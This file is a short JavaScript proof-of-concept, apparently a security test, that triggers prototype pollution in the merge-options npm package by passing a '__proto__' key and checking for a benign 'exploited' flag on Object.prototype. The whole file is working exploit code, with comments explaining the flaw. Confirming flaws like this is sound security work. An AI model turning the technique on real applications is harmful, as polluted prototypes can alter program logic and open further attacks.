async function exploit() {
    const mergeOptions = require('merge-options');

    // 1. Reset test state to ensure we detect pollution from this specific run
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited')) {
        delete Object.prototype['exploited'];
    }

    // 2. Trigger the vulnerability.
    // The vulnerable `merge` function iterates over every enumerable key in the 
    // source object and blindly assigns it to the target object without validation.
    // By passing '__proto__' as a key, we instruct the merge logic to set:
    // merged['__proto__'] = { exploited: true }
    // In JavaScript, modifying `__proto__` on a plain object alters its prototype chain,
    // which directly modifies `Object.prototype`.
    mergeOptions({ test: 1 }, { __proto__: { exploited: true } });

    // 3. Verify the pollution occurred
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited')) {
        console.log('[POC] ✓ Prototype pollution confirmed!');
        console.log(`[POC]   Object.prototype.exploited is now: ${Object.prototype.exploited}`);

        // Clean up for other tests to avoid cross-contamination
        delete Object.prototype['exploited'];
    } else {
        // Fail loudly if the vulnerability doesn't manifest as expected
        throw new Error('[POC] ✗ Prototype pollution failed. Property was not set on Object.prototype.');
    }
}

await exploit();
